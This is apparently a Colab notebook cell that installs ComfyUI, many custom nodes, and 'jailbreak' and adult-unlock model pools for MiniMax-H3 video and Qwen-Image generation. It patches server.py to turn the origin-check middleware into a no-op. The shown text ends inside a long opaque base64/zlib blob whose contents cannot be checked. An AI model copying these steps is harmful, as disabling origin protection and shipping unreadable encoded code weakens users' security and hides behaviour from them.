<div style="padding:16px 20px;border-radius:12px;background:linear-gradient(135deg,#1e1b4b,#311042);color:#fff;font-family:sans-serif;margin-bottom:12px;">
  <div style="font-size:22px;font-weight:800;margin-bottom:6px;">🎬 MiniMax-H3 &amp; 千问 Qwen-Image 2.1 全能工作台</div>
  <div style="font-size:13px;color:#cbd5e1;">📌 极简按需切换架构（用哪个只保留哪个配置 · 自动清理未选底模省空间 · H3视频与千问生图工作流完全隔离）</div>
</div>

| 步骤卡片（单点对应 ▶️ 即可） | 核心底模与配置 | 专属隔离池（LoRA + 工作流） | 适用场景 |
| :--- | :--- | :--- | :--- |
| **1️⃣ 第一步：安装底座环境** | ComfyUI 核心 + 全部高阶自定义节点 + 3款核心VAE/放大器 | 初始化基础运行底座与加速LoRA池 | **每次新开机必点一次** |
| **2️⃣ 第二步：H3 文生+首尾帧视频** | `64G` 官方 FL2VA 底模 + 2款破限 CLIP 自选 | H3 视频池（11套精调H3工作流） | 文生音视频、首尾帧图生视频 |
| **3️⃣ 第三步：H3 全能参考视频** | `64G` 官方 Ref2VA 全参底模 + 2款破限 CLIP 自选 | H3 视频池（11套精调H3工作流） | 多图/视频/音频参考、换人换脸、数字人 |
| **4️⃣ 第四步：FastH3-Omni 极速版** | `41G` BF16 + `13G` NVFP4 官方8步极速底模 | H3 视频池（11套精调H3工作流） | 极速多参生成、低步数高帧率预览 |
| **5️⃣ 第五步：C站 Remix / PRISM 破限版** | `64G/32G` Remix 或 `19.2G` PRISM三合一破限底模 | H3 视频池 + C站大人解锁池 | 写实大人解锁、6步极速融合、分块二采 |
| **6️⃣ 第六步：千问 Qwen 2.1 生图改图** | `13.6G` 千问2.1底模 + 专用双CLIP + 专用VAE | 千问图像池（13套千问专属工作流） | 文生图、双图换装、姿势画廊、角色三视图 |
| **7️⃣ 第七步：单独秒重启网页** | 不重下任何模型，10秒重开 ComfyUI 与免403隧道 | 保持当前已选环境 | 网页卡死/断连时极速恢复 |


In [ ]:
# @title 🛠️ 1. 必备基础框架（开机点一次 · 极速并发装节点/VAE/放大器/LoRA池）
# @markdown > 💡 **开机只需点一次本单元**：自动并发安装全部节点、音视频 VAE、潜空间放大器与 H3 专属 LoRA 池。
C站_API_Token = "" # @param {type:"string"}
import os, subprocess, json, zlib, base64, urllib.request, time
from concurrent.futures import ThreadPoolExecutor

t0 = time.time()
print("🚀 [1/4] 正在极速初始化 ComfyUI 核心与 uv / aria2 加速引擎...")
os.chdir("/content")
if not os.path.exists("/content/ComfyUI/main.py"):
    subprocess.run("rm -rf /tmp/comfy_core && git clone --depth 1 https://github.com/comfyanonymous/ComfyUI.git /tmp/comfy_core && mkdir -p /content/ComfyUI && cp -rn /tmp/comfy_core/. /content/ComfyUI/ && rm -rf /tmp/comfy_core", shell=True, check=False)
os.chdir("/content/ComfyUI")

subprocess.run("(apt-get update -qq && apt-get -y install -qq aria2) >/dev/null 2>&1 & pip install -q uv && wait", shell=True, check=False)
subprocess.run("uv pip install --system -q -r requirements.txt", shell=True, check=False)
subprocess.run("uv pip install --system -q huggingface_hub hf_transfer gguf librosa soundfile einops scipy torchvision torchaudio ultralytics opencv-python-headless rotary_embedding_torch omegaconf peft timm albumentations scikit-image matplotlib piexif numba blend_modes colour-science rembg onnxruntime segment-anything dill insightface diffusers accelerate addict munkres mmengine https://archive1.piwheels.org/simple/mmcv/mmcv-2.1.0-py2.py3-none-any.whl", shell=True, check=False)

cm_path = "/content/ComfyUI/middleware/cache_middleware.py"
if os.path.exists(cm_path):
    open(cm_path, "w", encoding="utf-8").write("""from aiohttp import web
from typing import Callable, Awaitable
import os, io, gzip, mimetypes
from PIL import Image

IMG_EXTENSIONS = (".jpg", ".jpeg", ".png", ".ppm", ".bmp", ".pgm", ".tif", ".tiff", ".webp", ".woff", ".woff2", ".ttf", ".svg")
_OBJ_INFO_CACHE = {"key": None, "raw": None, "gz": None, "ct": "application/json"}
_FILE_MEM_CACHE = {}

def _guess_ct(path: str) -> str:
    p = path.lower()
    if p.endswith((".js", ".mjs", ".cjs")):
        return "application/javascript"
    if p.endswith(".css"):
        return "text/css"
    if p.endswith(".json"):
        return "application/json"
    if p.endswith(".svg"):
        return "image/svg+xml"
    if p.endswith(".wasm"):
        return "application/wasm"
    ct, _ = mimetypes.guess_type(p)
    return ct or "application/octet-stream"

def _model_state_key():
    parts = []
    for d in ("diffusion_models", "loras", "text_encoders", "vae", "latent_upscale_models", "checkpoints", "vae_approx"):
        p = f"/content/ComfyUI/models/{d}"
        if os.path.isdir(p):
            try:
                parts.append(",".join(sorted(os.listdir(p))))
            except Exception:
                pass
    for extra_d in ("/content/ComfyUI/custom_nodes", "/content/ComfyUI/input"):
        if os.path.isdir(extra_d):
            try:
                parts.append(",".join(sorted(os.listdir(extra_d))))
            except Exception:
                pass
    return "|".join(parts)

@web.middleware
async def cache_control(request: web.Request, handler: Callable[[web.Request], Awaitable[web.Response]]) -> web.Response:
    if request.method == "POST" and ("upload" in request.path):
        _OBJ_INFO_CACHE["key"] = None
    if request.path in ("/global_subgraphs", "/api/global_subgraphs") or request.path.startswith(("/global_subgraphs/", "/api/global_subgraphs/")):
        return web.Response(text="{}", content_type="application/json", headers={"Cache-Control": "public, max-age=3600"})
    if request.path in ("/user.css", "/api/userdata/user.css"):
        return web.Response(text="", content_type="text/css", headers={"Cache-Control": "public, max-age=86400"})
    if request.path == "/api/userdata/comfy.templates.json":
        return web.Response(text="[]", content_type="application/json", headers={"Cache-Control": "public, max-age=86400"})
    if request.path in ("/object_info", "/api/object_info"):
        k = _model_state_key()
        accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
        if _OBJ_INFO_CACHE["key"] == k and _OBJ_INFO_CACHE["raw"] is not None:
            if accept_gz and _OBJ_INFO_CACHE["gz"] is not None:
                return web.Response(body=_OBJ_INFO_CACHE["gz"], content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
            return web.Response(body=_OBJ_INFO_CACHE["raw"], content_type=_OBJ_INFO_CACHE["ct"])
        resp = await handler(request)
        if resp.status == 200 and getattr(resp, "body", None):
            raw_b = bytes(resp.body)
            gz_b = gzip.compress(raw_b, compresslevel=5)
            _OBJ_INFO_CACHE["key"] = k
            _OBJ_INFO_CACHE["raw"] = raw_b
            _OBJ_INFO_CACHE["gz"] = gz_b
            if accept_gz:
                return web.Response(body=gz_b, content_type=_OBJ_INFO_CACHE["ct"], headers={"Content-Encoding": "gzip"})
        return resp
    if request.path in ("/view", "/api/view") and not request.query.get("raw"):
        fn = request.query.get("filename", "")
        ftype = request.query.get("type", "output")
        sub = request.query.get("subfolder", "").strip("/")
        if fn.lower().endswith(".png") and ftype in ("output", "input", "temp"):
            base = f"/content/ComfyUI/{ftype}"
            fpath = os.path.join(base, sub, fn) if sub else os.path.join(base, fn)
            if os.path.isfile(fpath):
                try:
                    with Image.open(fpath) as im:
                        buf = io.BytesIO()
                        im.save(buf, format="WEBP", quality=85, method=1)
                        return web.Response(body=buf.getvalue(), content_type="image/webp", headers={"Cache-Control": "public, max-age=86400"})
                except Exception:
                    pass
    accept_gz = "gzip" in request.headers.get("Accept-Encoding", "")
    if request.method == "GET" and request.path in _FILE_MEM_CACHE:
        entry = _FILE_MEM_CACHE[request.path]
        if accept_gz and entry["gz"] is not None:
            return web.Response(body=entry["gz"], content_type=entry["ct"], headers={"Content-Encoding": "gzip", "Cache-Control": entry["cc"]})
        return web.Response(body=entry["raw"], content_type=entry["ct"], headers={"Cache-Control": entry["cc"]})
    response: web.Response = await handler(request)
    if request.path.startswith(("/extensions/", "/assets/", "/rgthree/", "/scripts/")) and response.status == 200:
        cc = "public, max-age=604800, immutable" if request.path.startswith("/assets/") else "public, max-age=3600"
        response.headers["Cache-Control"] = cc
        fpath = getattr(response, "_path", None)
        if fpath and os.path.isfile(str(fpath)):
            try:
                raw_b = open(str(fpath), "rb").read()
                ct = _guess_ct(request.path)
                gz_b = gzip.compress(raw_b, compresslevel=5) if len(raw_b) > 512 else None
                _FILE_MEM_CACHE[request.path] = {"raw": raw_b, "gz": gz_b, "ct": ct, "cc": cc}
                if accept_gz and gz_b is not None:
                    return web.Response(body=gz_b, content_type=ct, headers={"Content-Encoding": "gzip", "Cache-Control": cc})
                return web.Response(body=raw_b, content_type=ct, headers={"Cache-Control": cc})
            except Exception:
                pass
    elif request.path.lower().endswith(IMG_EXTENSIONS) and response.status == 200:
        response.headers.setdefault("Cache-Control", "public, max-age=86400")
    if (
        isinstance(response, web.Response)
        and not isinstance(response, web.FileResponse)
        and getattr(response, "body", None)
        and isinstance(response.body, (bytes, bytearray))
        and len(response.body) > 1024
        and "Content-Encoding" not in response.headers
        and accept_gz
    ):
        response.body = gzip.compress(bytes(response.body), compresslevel=5)
        response.headers["Content-Encoding"] = "gzip"
        response.headers["Content-Length"] = str(len(response.body))
    return response
""")

s_path = "/content/ComfyUI/server.py"
if os.path.exists(s_path):
    txt = open(s_path, "r", encoding="utf-8").read()
    if "_noop" not in txt:
        txt = txt.replace(
            "def create_origin_only_middleware():",
            "def create_origin_only_middleware():\n    from aiohttp import web\n    @web.middleware\n    async def _noop(request, handler):\n        return await handler(request)\n    return _noop\ndef _old_origin():"
        )
        open(s_path, "w", encoding="utf-8").write(txt)

print(f"🧩 [2/4] 正在 16 线程并发克隆 27 个自定义节点插件 (已耗时 {int(time.time()-t0)}s)...")
os.makedirs("/content/ComfyUI/custom_nodes", exist_ok=True)
plugins = [
    ("ComfyUI-Manager", "https://github.com/ltdrdata/ComfyUI-Manager.git"),
    ("ComfyUI-MiniMaxH3-Easy", "https://github.com/nkxx188/ComfyUI-MiniMaxH3-Easy.git"),
    ("ComfyUI-FeiHou-Easy-H3", "https://github.com/FX-FeiHou/ComfyUI-FeiHou-Easy-H3.git"),
    ("ComfyUI-FeiHou-Toolbox", "https://github.com/FX-FeiHou/ComfyUI-FeiHou-Toolbox.git"),
    ("ComfyUI-VideoHelperSuite", "https://github.com/Kosinkadink/ComfyUI-VideoHelperSuite.git"),
    ("ai-pose-gallery-zh", "https://github.com/anhao/ai-pose-gallery-zh.git"),
    ("ComfyUI-H3-FaceRefine", "https://github.com/Carasibana/ComfyUI-H3-FaceRefine.git"),
    ("comfyui-h3-oneclick-swap", "https://github.com/D3voz/comfyui-h3-oneclick-swap.git"),
    ("ComfyUI-KJNodes", "https://github.com/kijai/ComfyUI-KJNodes.git"),
    ("ComfyUI-Easy-Use", "https://github.com/yolain/ComfyUI-Easy-Use.git"),
    ("rgthree-comfy", "https://github.com/rgthree/rgthree-comfy.git"),
    ("ComfyUI-MiniMaxH3-PrefixStream", "https://github.com/knoic/ComfyUI-MiniMaxH3-PrefixStream.git"),
    ("ComfyUI-LTXVideo", "https://github.com/Lightricks/ComfyUI-LTXVideo.git"),
    ("Comfyui_Minimax_h3_latent_Upscaler", "https://github.com/LBH-123-AI/Comfyui_Minimax_h3_latent_Upscaler.git"),
    ("ComfyUI-AusBoss", "https://github.com/ausboss/ComfyUI-AusBoss.git"),
    ("comfyui-SelfLift", "https://github.com/facok/comfyui-SelfLift.git"),
    ("ComfyUI-H3-LongVideo", "https://github.com/Zzz1phyrf/ComfyUI-H3-LongVideo.git"),
    ("selflift-Avatar", "https://github.com/slmonker/selflift-Avatar.git"),
    ("ComfyUI-YCNodes-MiniMax-H3", "https://github.com/yichengup/ComfyUI-YCNodes-MiniMax-H3.git"),
    ("ComfyUI-MiniMaxH3-TimelineDirector", "https://github.com/Songssx/ComfyUI-MiniMaxH3-TimelineDirector.git"),
    ("Goohaitools-comfyui", "https://github.com/goohai/Goohaitools-comfyui.git"),
    ("ComfyUI_essentials", "https://github.com/cubiq/ComfyUI_essentials.git"),
    ("ComfyUI_LayerStyle", "https://github.com/chflame163/ComfyUI_LayerStyle.git"),
    ("ComfyUI-Impact-Pack", "https://github.com/ltdrdata/ComfyUI-Impact-Pack.git"),
    ("comfyui_controlnet_aux", "https://github.com/Fannovel16/comfyui_controlnet_aux.git"),
    ("ComfyUI-Inpaint-CropAndStitch", "https://github.com/lquesada/ComfyUI-Inpaint-CropAndStitch.git"),
    ("ComfyUI_AdvancedRefluxControl", "https://github.com/kaibioinfo/ComfyUI_AdvancedRefluxControl.git"),
    ("ComfyUI_ZenID", "https://github.com/vuongminh1907/ComfyUI_ZenID.git"),
    ("ComfyUI-SDPose-OOD", "https://github.com/judian17/ComfyUI-SDPose-OOD.git"),
    ("Comfy-Canvas", "https://github.com/Zlata-Salyukova/Comfy-Canvas.git"),
    ("ComfyUI-qwenmultiangle", "https://github.com/jtydhr88/ComfyUI-qwenmultiangle.git"),
    ("ComfyUI-H3-Context-Noise", "https://github.com/Beijinren/ComfyUI-H3-Context-Noise.git"),
    ("ComfyUI-H3-Motion-Context", "https://github.com/NikoDemon80/ComfyUI-H3-Motion-Context.git"),
    ("ComfyUI-SeedVR2_VideoUpscaler", "https://github.com/numz/ComfyUI-SeedVR2_VideoUpscaler.git"),
]

def _clone_one(item):
    name, repo = item
    dst = f"/content/ComfyUI/custom_nodes/{name}"
    if not os.path.exists(dst):
        subprocess.run(["git", "clone", "--depth", "1", "-q", repo, dst], check=False)

with ThreadPoolExecutor(max_workers=16) as ex:
    list(ex.map(_clone_one, plugins))

ROBOT_NATIVE_B64 = "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